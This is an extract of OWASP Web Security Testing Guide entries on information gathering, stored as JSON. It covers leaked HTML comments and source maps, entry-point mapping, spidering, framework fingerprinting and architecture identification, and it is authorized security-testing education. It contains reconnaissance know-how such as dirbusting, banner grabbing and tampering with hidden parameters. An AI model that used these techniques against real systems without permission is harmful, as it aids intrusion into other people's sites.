    "WSTG-INFO-05": {
        "summary": "<h3>Summary</h3><p>It is very common, and even recommended, for programmers to include detailed comments and metadata on their source code. However, comments and metadata included in the HTML code might reveal internal information that should not be available to potential attackers. Comments and metadata review should be done in order to determine if any information is being leaked. Additionally some applications may leak information in the body of redirect responses.</p><p>For modern web apps, the use of client-side JavaScript for the frontend is becoming more popular. Popular frontend construction technologies use client-side JavaScript like ReactJS, AngularJS, or Vue. Similar to the comments and metadata in HTML code, many programmers also hardcode sensitive information in JavaScript variables on the frontend. Sensitive information can include (but is not limited to): Private API Keys ( e.g. an unrestricted Google Map API Key), internal IP addresses, sensitive routes ( e.g. route to hidden admin pages or functionality), or even credentials. This sensitive information can be leaked from such frontend JavaScript code. A review should be done in order to determine if any sensitive information leaked which could be used by attackers for abuse.</p><p>For large web applications, performance issues are a big concern to programmers. Programmers have used different methods to optimize frontend performance, including Syntactically Awesome Style Sheets (Sass), Sassy CSS (SCSS), webpack, etc. Using these technologies, frontend code will sometimes become harder to understand and difficult to debug, and because of it, programmers often deploy source map files for debugging purposes. A “source map” is a special file that connects a minified/uglified version of an asset (CSS or JavaScript) to the original authored version. Programmers are still debating whether or not to bring source map files to the production environment. However, it is undeniable that source map files or files for debugging if released to the production environment will make their source more human-readable. It can make it easier for attackers to find vulnerabilities from the frontend or collect sensitive information from it. JavaScript code review should be done in order to determine if any debug files are exposed from the frontend. Depending on the context and sensitivity of the project, a security expert should decide whether the files should exist in the production environment or not.</p><h3>Test Objectives</h3><ul><li>Review web page comments, metadata, and redirect bodies to find any information leakage.</li><li>Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.</li><li>Identify if source map files or other frontend debug files exist.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>HTML comments are often used by the developers to include debugging information about the application. Sometimes, they forget about the comments and they leave them in production environments. Testers should look for HTML comments which start with <!-- .</p><p>Check HTML source code for comments containing sensitive information that can help the attacker gain more insight about the application. It might be SQL code, usernames and passwords, internal IP addresses, or debugging information.</p><pre><code>... <div class= \"table2\" > <div class= \"col1\" > 1 </div><div class= \"col2\" > Mary </div> <div class= \"col1\" > 2 </div><div class= \"col2\" > Peter </div> <div class= \"col1\" > 3 </div><div class= \"col2\" > Joe </div> <!-- Query: SELECT id, name FROM app.users WHERE active='1' --> </div> ...</code></pre><p>The tester may even find something like this:</p><pre><code><!-- Use the DB administrator password for testing:  f@keP@a$$w0rD --></code></pre><p>Check HTML version information for valid version numbers and Data Type Definition (DTD) URLs</p><pre><code><!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"https://www.w3.org/TR/html4/strict.dtd\"></code></pre><ul><li>strict.dtd– default strict DTD</li><li>loose.dtd– loose DTD</li><li>frameset.dtd– DTD for frameset documents</li></ul><p>Some META tags do not provide active attack vectors but instead allow an attacker to profile an application:</p><pre><code><META name= \"Author\" content= \"Andrew Muller\" ></code></pre><p>A common (but not WCAG compliant) META tag is Refresh .</p><pre><code><META http-equiv= \"Refresh\" content= \"15;URL=https://www.owasp.org/index.html\" ></code></pre><p>A common use for META tag is to specify keywords that a search engine may use to improve the quality of search results.</p><pre><code><META name= \"keywords\" lang= \"en-us\" content= \"OWASP, security, sunshine, lollipops\" ></code></pre><p>Although most web servers manage search engine indexing via the robots.txt file, it can also be managed by META tags. The tag below will advise robots to not index and not follow links on the HTML page containing the tag.</p><pre><code><META name= \"robots\" content= \"none\" ></code></pre><p>The Platform for Internet Content Selection (PICS) and Protocol for Web Description Resources (POWDER) provide infrastructure for associating metadata with Internet content.</p><p>Programmers often hardcode sensitive information with JavaScript variables on the frontend. Testers should check HTML source code and look for JavaScript code between <script> and </script> tags. Testers should also identify external JavaScript files to review the code (JavaScript files have the file extension .js and name of the JavaScript file usually put in the src (source) attribute of a <script> tag).</p><p>Check JavaScript code for any sensitive information leaks which could be used by attackers to further abuse or manipulate the system. Look for values such as: API keys, internal IP addresses, sensitive routes, or credentials. For example:</p><pre><code>const myS3Credentials = { accessKeyId : config ( ' AWSS3AccessKeyID ' ), secretAccessKey : config ( ' AWSS3SecretAccessKey ' ), };</code></pre><p>The tester may even find something like this:</p><pre><code>var conString = \" tcp://postgres:1234@localhost/postgres \" ;</code></pre><p>When an API Key is found, testers can check if the API Key restrictions are set per service or by IP, HTTP referrer, application, SDK, etc.</p><p>For example, if testers find a Google Map API Key, they can check if this API Key is restricted by IP or restricted only per the Google Map APIs. If the Google API Key is restricted only per the Google Map APIs, attackers can still use that API Key to query unrestricted Google Map APIs and the application owner must pay for that.</p><pre><code><script type= \"application/json\" > ... { \" GOOGLE_MAP_API_KEY \" : \" AIzaSyDUEBnKgwiqMNpDplT6ozE4Z0XxuAbqDi4 \" , \" RECAPTCHA_KEY \" : \" 6LcPscEUiAAAAHOwwM3fGvIx9rsPYUq62uRhGjJ0 \" } ... </script></code></pre><p>In some cases, testers may find sensitive routes from JavaScript code, such as links to internal or hidden admin pages.</p><pre><code><script type= \"application/json\" > ... \" runtimeConfig \" :{ \" BASE_URL_VOUCHER_API \" : \" https://staging-voucher.victim.net/api \" , \" BASE_BACKOFFICE_API \" : \" https://10.10.10.2/api \" , \" ADMIN_PAGE \" : \" /hidden_administrator \" } ... </script></code></pre><p>Source map files will usually be loaded when DevTools open. Testers can also find source map files by adding the “.map” extension after the extension of each external JavaScript file. For example, if a tester sees a /static/js/main.chunk.js file, they can then check for its source map file by visiting /static/js/main.chunk.js.map .</p><p>Check source map files for any sensitive information that can help the attacker gain more insight about the application. For example:</p><pre><code>{ \"version\" : 3 , \"file\" : \"static/js/main.chunk.js\" , \"sources\" : [ \"/home/sysadmin/cashsystem/src/actions/index.js\" , \"/home/sysadmin/cashsystem/src/actions/reportAction.js\" , \"/home/sysadmin/cashsystem/src/actions/cashoutAction.js\" , \"/home/sysadmin/cashsystem/src/actions/userAction.js\" , \"...\" ], \"...\" }</code></pre><p>When sites load source map files, the frontend source code will become readable and easier to debug.</p><p>Although redirect responses are not generally expected to contain any significant web content there is no assurance that they cannot contain content. So, while series 300 (redirect) responses often contain “redirecting to https://example.com/ ” type content they may also leak content.</p><p>Consider a situation in which a redirect response is the result of an authentication or authorization check, if that check fails the server may respond redirecting the user back to a “safe” or “default” page, yet the redirect response itself may still contain content which isn’t shown in the browser but is indeed transmitted to the client. This can be seen either leveraging browser developer tools or via a personal proxy (such as ZAP, Burp, Fiddler, or Charles).</p>",
        "tools": "<h3>Tools</h3><ul><li>Wget</li><li>Browser “view source” function</li><li>Eyeballs</li><li>Curl</li><li>Zed Attack Proxy (ZAP)</li><li>Burp Suite</li><li>Waybackurls</li><li>Google Maps API Scanner</li></ul><h3>References</h3><ul><li>KeyHacks</li><li>RingZer0 Online CTF- Challenge 104 “Admin Panel”.</li></ul><ul><li>HTML version 4.01</li><li>XHTML</li><li>HTML version 5</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INFO-06": {
        "summary": "<h3>Summary</h3><p>Enumerating the application and its attack surface is a key precursor before any thorough testing can be undertaken, as it allows the tester to identify likely areas of weakness. This section aims to help identify and map out areas within the application that should be investigated once enumeration and mapping have been completed.</p><h3>Test Objectives</h3><ul><li>Identify possible entry and injection points through request and response analysis.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Before any testing begins, the tester should always get a good understanding of the application and how the user and browser communicates with it. As the tester walks through the application, they should pay attention to all HTTP requests as well as every parameter and form field that is passed to the application. They should pay special attention to when GET requests are used and when POST requests are used to pass parameters to the application. In addition, they also need to pay attention to when other methods for RESTful services are used.</p><p>Note that in order to see the parameters sent in the body of requests such as a POST request, the tester may want to use a tool such as an intercepting proxy (see tools ). Within the POST request, the tester should also make special note of any hidden form fields that are being passed to the application, as these usually contain sensitive information such as state information, quantity of items, the price of items, etc., that the developer never intended for anyone to see or change.</p><p>The usage of an intercepting proxy and a note taking application (for example, a spreadsheet software) for this stage of testing is popular among testers. The proxy will keep track of every request and response between the tester and the application as they explore it. Additionally, at this point, testers usually trap every request and response so that they can see exactly every header, parameter, etc. that is being passed to the application and what is being returned. This can be quite tedious at times, especially on large interactive sites (think of a banking application). However, experience will show what to look for and this phase can be significantly optimized.</p><p>As the tester walks through the application, they should take note of any interesting parameters in the URL, custom headers, or body of the requests/responses, and save them in a spreadsheet. The spreadsheet should include the page requested (it might be good to also add the request number from the proxy, for future reference), the interesting parameters, the type of request (GET, POST, etc.), if access is authenticated/unauthenticated, if TLS is used, if it’s part of a multi-step process, if WebSockets are used, and any other relevant notes. Once they have every area of the application mapped out, they can then go through the application and test each of the areas that they have identified and make notes for what worked and what didn’t work. The rest of this guide will identify how to test each of these areas of interest, but this section must be undertaken before any of the actual testing can commence.</p><p>Below are some points of interests for all requests and responses. Within the requests section, focus on the GET and POST methods as these comprise majority of the requests. Note that other methods, such as PUT and DELETE can also be found. Often, such rarer requests, if allowed, can expose vulnerabilities. There is a special section in this guide dedicated for testing these HTTP methods.</p><ul><li>Identify where GETs are used and where POSTs are used.</li><li>Identify all the parameters used in a POST request (these are in the body of the request).</li><li>Within the POST request, pay special attention to any hidden parameters. When a POST is sent, all the form fields (including hidden parameters) will be sent in the body of the HTTP message to the application. These typically aren’t seen unless a proxy is used, or the HTML source code is viewed. Altering these hidden parameters may result in changes to the following pages that load, the data they contain, and the degree of access granted.</li><li>Identify all the parameters used in a GET request (i.e., in the URL), particularly the query string (usually appearing after a ? mark).</li><li>Identify all the parameters of the query string. These usually are in a pair format, such asfoo=bar. Also note that many parameters can be in one query string separated by a&,\\~,:, or any other special character or encoding.</li><li>Please note, when identifying multiple parameters in one string or within a POST request, some or all of the parameters will be required to execute the attacks. The tester needs to identify all of the parameters (even if they are encoded or encrypted) and identify which ones are processed by the application. Later sections of the guide will cover how to test these parameters. At this point, it is important to make sure that each one of them is identified.</li><li>Also pay attention to any additional or custom type headers not typically seen (such asdebug: false).</li></ul><ul><li>Identify where new cookies are set (Set-Cookieheader), modified, or added to.</li><li>Identify any redirects (3xx HTTP status code), 400 status codes (particularly 403 Forbidden), and 500 internal server errors during normal responses (i.e., unmodified requests).</li><li>Also note where any interesting headers are used. For example,Server: BIG-IPindicates that the site is load balanced. Thus, if a site is load balanced and one server is incorrectly configured, then the tester might have to make multiple requests to access the vulnerable server, depending on the type of load balancing used.</li></ul><p>The Attack Surface Detector (ASD) tool investigates the source code and uncovers the endpoints of a web application, the parameters these endpoints accept, and the data type of those parameters. This includes unlinked endpoints that a spider wouldn’t be able to find, as well as optional parameters that are completely unused in the client-side code. It also has the capability to calculate the changes in attack surface between two versions of an application.</p><p>The Attack Surface Detector is available as a plugin to both ZAP and Burp Suite, and a command-line tool is also available. The command-line tool exports the attack surface as a JSON output, which can then be used by the ZAP and Burp Suite plugin. This is helpful for cases where the source code is not provided to the penetration tester directly. For example, the penetration tester can get the json output file from a customer who does not want to provide the source code itself.</p><p>The CLI jar file is available for download from https://github.com/secdec/attack-surface-detector-cli/releases .</p><p>You can run the following command for ASD to identify endpoints from the source code of the target web application.</p><p>java -jar attack-surface-detector-cli-1.3.5.jar <source-code-path> [flags]</p><p>Here is an example of running the command against OWASP RailsGoat .</p><pre><code>$ java -jar attack-surface-detector-cli-1.3.5.jar railsgoat/\nBeginning endpoint detection for '<...>/railsgoat' with 1 framework types\nUsing framework=RAILS\n[0] GET: /login (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_contro\nller.rb (lines '6'-'9')\n[1] GET: /logout (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[2] POST: /forgot_password (0 variants): PARAMETERS={email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/\npassword_resets_controller.rb (lines '29'-'38')\n[3] GET: /password_resets (0 variants): PARAMETERS={token=name=token, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/p\nassword_resets_controller.rb (lines '19'-'27')\n[4] POST: /password_resets (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user=name=user, paramType=QUERY_STRING, dataType=STRING, confirm_password=name=confirm_password, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/password_resets_controller.rb (lines '5'-'17')\n[5] GET: /sessions/new (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\n[6] POST: /sessions (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user_id=name=user_id, paramType=SESSION, dataType=STRING, remember_me=name=remember_me, paramType=QUERY_STRING, dataType=STRING, url=name=url, paramType=QUERY_STRING, dataType=STRING, email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '11'-'31')\n[7] DELETE: /sessions/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[8] GET: /users (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '9'-'11')\n[9] GET: /users/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '13'-'15')\n... snipped ...\n[38] GET: /api/v1/mobile/{id} (0 variants): PARAMETERS={id=name=id, paramType=QUERY_STRING, dataType=STRING, class=name=class, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/api/v1/mobile_controller.rb (lines '8'-'13')\n[39] GET: / (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\nGenerated 40 distinct endpoints with 0 variants for a total of 40 endpoints\nSuccessfully validated serialization for these endpoints\n0 endpoints were missing code start line\n0 endpoints were missing code end line\n0 endpoints had the same code start and end line\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n- 36/36 have their data type\n- 0/36 have a list of accepted values\n- 36/36 have their parameter type\n--- QUERY_STRING: 35\n--- SESSION: 1\nFinished endpoint detection for '<...>/railsgoat'\n----------\n-- DONE --\n0 projects had duplicate endpoints\nGenerated 40 distinct endpoints\nGenerated 40 total endpoints\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n1/1 projects had endpoints generated\nTo enable logging include the -debug argument</code></pre><p>You can also generate a JSON output file using the -json flag, which can be used by the plugin for both ZAP and Burp Suite. See the following links for more details.</p><ul><li>Home of ASD Plugin for ZAP</li><li>Home of ASD Plugin for PortSwigger Burp</li></ul><p>The following are two examples on how to check for application entry points.</p><p>This example shows a GET request that would purchase an item from an online shopping application.</p><pre><code>GET /shoppingApp/buyme.asp?CUSTOMERID=100&ITEM=z101a&PRICE=62.50&IP=x.x.x.x HTTP/1.1\nHost: x.x.x.x\nCookie: SESSIONID=Z29vZCBqb2IgcGFkYXdhIG15IHVzZXJuYW1lIGlzIGZvbyBhbmQgcGFzc3dvcmQgaXMgYmFy</code></pre><p>All the parameters of the request such as CUSTOMERID, ITEM, PRICE, IP, and the Cookie, which could just be encoded parameters or parameters used for session state.</p><p>This example shows a POST request that would log you into an application.</p><pre><code>POST /example/authenticate.asp?service=login HTTP/1.1\nHost: x.x.x.x\nCookie: SESSIONID=dGhpcyBpcyBhIGJhZCBhcHAgdGhhdCBzZXRzIHByZWRpY3RhYmxlIGNvb2tpZXMgYW5kIG1pbmUgaXMgMTIzNA==;CustomCookie=00my00trusted00ip00is00x.x.x.x00\n\nuser=admin&pass=pass123&debug=true&fromtrustIP=true</code></pre><p>It can be noted that the parameters are sent in several locations:</p><p>Having a variety of injection locations provides the attacker with chaining possibilities that could improve the chances of finding a bug in the handling code.</p>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>Burp Suite</li><li>Fiddler</li></ul><h3>References</h3><ul><li>RFC 2616 – Hypertext Transfer Protocol – HTTP 1.1</li><li>OWASP Attack Surface Detector</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INFO-07": {
        "summary": "<h3>Summary</h3><p>Before commencing security testing, understanding the structure of the application is paramount. Without a thorough understanding of the application’s layout, a comprehensive test is unlikely.</p><h3>Test Objectives</h3><ul><li>Map the target application and understand the principal workflows.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>In black-box testing, it is extremely difficult to test the entire codebase. This is not just because the tester cannot see the code paths through the application, but also because testing all the code paths would be extremely time-consuming. One way to reconcile this is to document the code paths that were discovered and tested.</p><p>There are several ways to approach the testing and measurement of code coverage:</p><ul><li>Path- test each of the paths through an application that includes combinatorial and boundary value analysis testing for each decision path. While this approach offers thoroughness, the number of testable paths grows exponentially with each decision branch.</li><li>Data Flow (or Taint Analysis)- tests the assignment of variables via external interaction (normally users). Focuses on mapping the flow, transformation and use of data throughout an application.</li><li>Race- tests multiple concurrent instances of the application manipulating the same data.</li></ul><p>The choice of method and the extent to which each method is used should be negotiated with the application owner. Additionally, simpler approaches could be adopted. For example, the tester could ask the application owner about specific functions or code sections that they are particularly concerned about, and discuss how those code segments can be reached.</p><p>To demonstrate code coverage to the application owner, the tester can start by documenting all the links discovered from spidering the application (either manually or automatically) in a spreadsheet. The tester can then look more closely at decision points in the application and investigate how many significant code paths are discovered. These should then be documented in the spreadsheet with URLs, prose and screenshot descriptions of the paths discovered.</p><p>An automatic spider is a tool that is used to discover new resources (URLs) on a specific site automatically. It begins with a list of URLs to visit, called the seeds, which depends on how the Spider is started. While there are a lot of Spidering tools, the following example uses the Zed Attack Proxy (ZAP) :</p><p>Figure 4.1.7-1: Zed Attack Proxy Screen</p><br><p>ZAP offers various automatic spidering options, which can be leveraged based on the tester’s needs:</p><ul><li>Spider</li><li>Ajax Spider</li><li>OpenAPI Support</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>List of spreadsheet software</li><li>Diagramming software</li></ul><h3>References</h3><ul><li>Code Coverage</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INFO-08": {
        "summary": "<h3>Summary</h3><p>It wouldn’t be a stretch to say that almost every conceivable idea for a web application has already been put into development. With the vast number of free and open-source software projects that are actively developed and deployed globally, it is very likely that an application security test will encounter a target that is entirely or partly dependent on these well-known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested helps the testing process significantly and will also drastically reduce the effort required during the test. These well-known web applications have specific HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most web frameworks have several markers in these locations, which can assist an attacker or tester in recognizing them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy, several markers are usually used.</p><h3>Test Objectives</h3><ul><li>Fingerprint the components used by the web applications.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>There are several common locations to consider in order to identify frameworks or components:</p><ul><li>HTTP headers</li><li>Cookies</li><li>HTML source code</li><li>Specific files and folders</li><li>File extensions</li><li>Error messages</li></ul><p>The most basic form of identifying a web framework is to look at the X-Powered-By field in the HTTP response header. Many tools can be used to fingerprint a target, the simplest one is netcat.</p><p>Consider the following HTTP Request-Response:</p><pre><code>$ nc 127.0.0.1 80\nHEAD / HTTP/1.0\n\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\n[...]\nX-Powered-By: Mono</code></pre><p>From the X-Powered-By field, we understand that the web application framework is likely to be Mono . However, although this approach is simple and quick, this methodology doesn’t work in all cases. It is possible to easily disable X-Powered-By header by a proper configuration. There are also several techniques that allow a site to obfuscate HTTP headers (see an example in the Remediation section). In the example above, we can also note that a specific version of nginx is being used to serve the content.</p><p>In the same example, the tester could either miss the X-Powered-By header or obtain an answer like the following:</p><pre><code>HTTP/1.1 200 OK\nServer: nginx/1.0.14\nDate: Sat, 07 Sep 2013 08:19:15 GMT\nContent-Type: text/html;charset=ISO-8859-1\nConnection: close\nVary: Accept-Encoding\nX-Powered-By: Blood, sweat and tears</code></pre><p>Sometimes there are more HTTP headers that point at a certain framework. In the following example, according to the information from HTTP request, one can see that X-Powered-By header contains PHP version. However, the X-Generator header points out the used framework is actually Swiftlet , which helps a penetration tester to expand their attack vectors. When performing fingerprinting, carefully inspect every HTTP header for such leaks.</p><pre><code>HTTP/1.1 200 OK\nServer: nginx/1.4.1\nDate: Sat, 07 Sep 2013 09:22:52 GMT\nContent-Type: text/html\nConnection: keep-alive\nVary: Accept-Encoding\nX-Powered-By: PHP/5.4.16-1~dotdeb.1\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nX-Generator: Swiftlet</code></pre><p>Another similar and somewhat more reliable way to determine the current web framework are framework-specific cookies.</p><p>Consider the following HTTP request:</p><p>Figure 4.1.8-7: Cakephp HTTP Request</p><br><p>The cookie CAKEPHP has automatically been set, which gives information about the framework being used. A list of common cookie names is presented in Cookies section. Limitations still exist in relying on this identification mechanism - it is possible to change the name of cookies. For example, for the selected CakePHP framework this could be done via the following configuration (excerpt from core.php ):</p><pre><code>/**\n* The name of CakePHP's session cookie.\n*\n* Note the guidelines for Session names states: \"The session name references\n* the session id in cookies and URLs. It should contain only alphanumeric\n* characters.\"\n* @link https://php.net/session_name\n*/ Configure :: write ( 'Session.cookie' , 'CAKEPHP' );</code></pre><p>However, these changes are less likely to be made than changes to the X-Powered-By header, making this approach to identification more reliable.</p><p>This technique is based on finding certain patterns in the HTML page source code. Often one can find a lot of information which helps a tester to recognize a specific component. One of the common markers is HTML comments that directly lead to framework disclosure. More often, certain framework-specific paths can be found, i.e. links to framework-specific CSS or JS folders. Finally, specific script variables might also point to a certain framework.</p><p>From the screenshot below, one can easily determine the framework in use and its version by the mentioned markers. The comment, specific paths and script variables can all help an attacker to quickly determine an instance of ZK framework.</p><p>Figure 4.1.8-2: ZK Framework HTML Source Sample</p><br><p>Frequently such information is positioned in the <head> section of HTTP responses, in <meta> tags, or at the end of the page. Nevertheless, entire responses should be analyzed since it can be useful for other purposes such as inspection of other useful comments and hidden fields. Sometimes, web developers may not sufficiently obscure the information about the frameworks or components used. It is still possible to stumble upon something like this at the bottom of the page:</p><p>Figure 4.1.8-3: Banshee Bottom Page</p><br><p>There is another approach which greatly helps an attacker or tester to identify applications or components with high accuracy. Every web application component has its specific file and folder structure on the server. It has been noted that one can see the specific path from the HTML page source but sometimes they are not explicitly presented there and may still reside on the server.</p><p>In order to uncover them, a technique known as forced browsing or “dirbusting” is used. Dirbusting is brute forcing a target with known folder and filenames and monitoring HTTP-responses to enumerate server content. This information can be used both for finding default files and attacking them, and for fingerprinting the web application. Dirbusting can be done in several ways, the example below shows a successful dirbusting attack against a WordPress-powered target with the help of defined list and intruder functionality of Burp Suite.</p><p>Figure 4.1.8-4: Dirbusting with Burp</p><br><p>We can see that for some WordPress-specific folders (for instance, /wp-includes/ , /wp-admin/ and /wp-content/ ) HTTP responses are 403 (Forbidden), 302 (Found, redirection to wp-login.php ), and 200 (OK) respectively. This is a good indicator that the target is WordPress powered. The same way it is possible to dirbust different application plugin folders and their versions. In the screenshot below one can see a typical CHANGELOG file of a Drupal plugin, which provides information on the application being used and discloses a vulnerable plugin version.</p><p>Figure 4.1.8-5: Drupal Botcha Disclosure</p><br><p>Tip: before starting with dirbusting, check the robots.txt file first. Sometimes application specific folders and other sensitive information can be found there as well. An example of such a robots.txt file is presented on a screenshot below.</p><p>Figure 4.1.8-6: Robots Info Disclosure</p><br><p>Specific files and folders are different for each specific application. If the identified application or component is Open Source there may be value in setting up a temporary installation during penetration tests in order to gain a better understanding of what infrastructure or functionality is presented, and what files might be left on the server. However, several useful file lists already exist; one notable example is the FuzzDB wordlists of predictable files/folders .</p><p>URLs may include file extensions that can also help identify the web platform or technology.</p><p>For example, the OWASP wiki used PHP:</p><pre><code>https://wiki.owasp.org/index.php?title=Fingerprint_Web_Application_Framework&action=edit&section=4</code></pre><p>Here are some common web file extensions and associated technologies:</p><ul><li>.php– PHP</li><li>.aspx– Microsoft ASP.NET</li><li>.jsp– Java Server Pages</li></ul><p>As can be seen in the following screenshot the listed file system path points to use of WordPress ( wp-content ). Also, testers should be aware that WordPress is PHP-based ( functions.php ).</p><p>Figure 4.1.8-7: WordPress Parse Error</p><br><h3>Common Identifiers</h3><ul><li>%framework_name%</li><li>powered by</li><li>built upon</li><li>running</li></ul>",
        "tools": "<h3>Tools</h3><p>A list of general and well-known tools is presented below. There are also a lot of other utilities, as well as framework-based fingerprinting tools.</p><p>Website: https://github.com/urbanadventurer/WhatWeb</p><p>WhatWeb is one of the best open source fingerprinting tools currently available on the market and is included in the default Kali Linux build. Language: Ruby Matches for fingerprinting are made with:</p><ul><li>Text strings (case sensitive)</li><li>Regular expressions</li><li>Google Hack Database queries (limited set of keywords)</li><li>MD5 hashes</li><li>URL recognition</li><li>HTML tag patterns</li><li>Custom ruby code for passive and aggressive operations</li></ul><p>Sample output is presented on a screenshot below:</p><p>Figure 4.1.8-8: Whatweb Output sample</p><br><p>Website: https://www.wappalyzer.com/</p><p>Wappalyzer is available in multiple usage models, the most popular of which is likely the Firefox/Chrome extensions. They work largely on regular expression matching and don’t need anything beyond the page being loaded in a browser. It works completely at the browser level and gives results in the form of icons. Although sometimes it has false positives, this is very handy to have notion of what technologies were used to construct a target site immediately after browsing a page.</p><p>Sample output of a plug-in is presented on a screenshot below.</p><p>Figure 4.1.8-9: Wappalyzer Output for OWASP site</p><br><h3>References</h3><ul><li>Saumil Shah: “An Introduction to HTTP fingerprinting”</li><li>Anant Shrivastava : “Web Application Finger Printing”</li></ul>",
        "remediation": "<h3>Remediation</h3><p>While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc., such efforts boil down to “security through obscurity”. System owners/administrators should recognize that such efforts only slow down the most rudimentary adversaries. The time and effort might be better spent on increasing stakeholder awareness and maintaining solutions.</p>",
        "test_objectives": ""
    },
    "WSTG-INFO-09": {
        "summary": "",
        "how-to": "",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INFO-10": {
        "summary": "<h3>Summary</h3><p>In order to effectively test an application, and to be able to provide meaningful recommendations on how to address any of the issues identified, it is important to understand what one is actually testing. Additionally, it could be helpful to determine whether specific components should be considered out-of-scope for testing.</p><p>Modern web applications can vary significantly in complexity, from a simple script running on a single server to a highly complex application spread across dozens of different systems, languages and components. There may also be additional network-level components such as firewalls or intrusion protection systems that can have a significant impact on testing.</p><h3>Test Objectives</h3><ul><li>Understand the architecture of the application and the technologies in use.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>When testing from a black box perspective, it is important to try and build a clear picture of how the application works, and which technologies and components are in place. In some cases, it is possible to test for specific components such as a web application firewall, while other components can be identified by inspecting the behavior of the application.</p><p>The sections below provide a high-level overview of common architectural components, along with details on how they can be identified.</p><p>Simple applications may run on a single server, which can be identified using the steps discussed in the Fingerprint Web Server section of the guide.</p><p>In a Platform-as-a-Service (PaaS) model, the web server and underlying infrastructure are managed by the service provider, and the customer is only responsible for the application that is deployed on them. From a testing perspective, there are two main differences:</p><ul><li>The application owner has no access to the underlying infrastructure, which means they will be unable to directly remediate any issues</li><li>Infrastructure testing is likely to be out-of-scope for any engagements</li></ul><p>In some cases, it is possible to identify the use of PaaS, as the application may use a specific domain name (for example, applications deployed on Azure App Services will have a *.azurewebsites.net domain - although they may also use custom domains). In other cases, it is difficult to determine whether PaaS is in use.</p><p>In a Serverless model, the developers provide code which is directly run on a hosting platform as individual functions, rather than running a traditional larger web application deployed in a webroot. This makes it well suited for microservice-based architecture. As with a PaaS environment, infrastructure testing is likely to be out-of-scope.</p><p>In some cases, the use of Serverless code may be indicated by the presence of specific HTTP headers. For example, AWS Lambda functions will typically return the following headers:</p><pre><code>X-Amz-Invocation-Type\nX-Amz-Log-Type\nX-Amz-Client-Context</code></pre><p>Azure Functions are less obvious. They typically return the Server: Kestrel header - but this on its own is not enough to determine that it is an Azure App function, as it could be some other code running on Kestrel.</p><p>In a microservice-based architecture, the application API is made up of multiple discrete services, instead of being run as a monolithic application. The services themselves often run inside containers (usually with Kubernetes), and can use a variety of different operating systems and languages. Although they are typically behind a single API gateway and domain, the use of multiple languages (often indicated in detailed error messages) can suggest that microservices are in use.</p><p>Many applications store static content on dedicated storage platforms, rather than hosting it directly on the main web server. The two most common platforms are Amazon’s S3 Buckets, and Azure’s Storage Accounts, and can be easily identified by the domain names:</p><ul><li>BUCKET.s3.amazonaws.comors3.REGION.amazonaws.com/BUCKETfor Amazon S3 Buckets</li><li>ACCOUNT.blob.core.windows.netfor Azure Storage Accounts</li></ul><p>These storage accounts can often expose sensitive files, as discussed in the Testing Cloud Storage Guide section.</p><p>Most non-trivial web applications use some kind of database to store dynamic content. In some cases, it’s possible to determine the database. This can often be done by:</p><ul><li>Port scanning the server and looking for any open ports associated with specific databases</li><li>Triggering SQL (or NoSQL) related error messages (or finding existing errors from asearch engine</li></ul><p>When it’s not possible to conclusively determine the database, the tester can often make an educated guess based on other aspects of the application:</p><ul><li>Windows, IIS and ASP.NET often use Microsoft SQL server</li><li>Embedded systems often use SQLite</li><li>PHP often uses MySQL or PostgreSQL</li><li>APEX often uses Oracle</li></ul><p>These are not hard rules, but can certainly give you a reasonable starting point if no better information is available.</p><p>Most applications have user authentication. There are multiple authentication backends that can be used, such as:</p><ul><li>Web server configuration (including.htaccessfiles) or hard-coding passwords in scriptsUsually shows up as HTTP Basic authentication, indicated by a pop-up in the browser and aWWW-Authenticate: BasicHTTP header</li><li>Usually shows up as HTTP Basic authentication, indicated by a pop-up in the browser and aWWW-Authenticate: BasicHTTP header</li><li>Local user accounts in a databaseUsually integrated into a form or API endpoint on the application</li><li>Usually integrated into a form or API endpoint on the application</li><li>An existing central authentication source such as Active Directory or an LDAP serverMay use NTLM authentication, indicated by 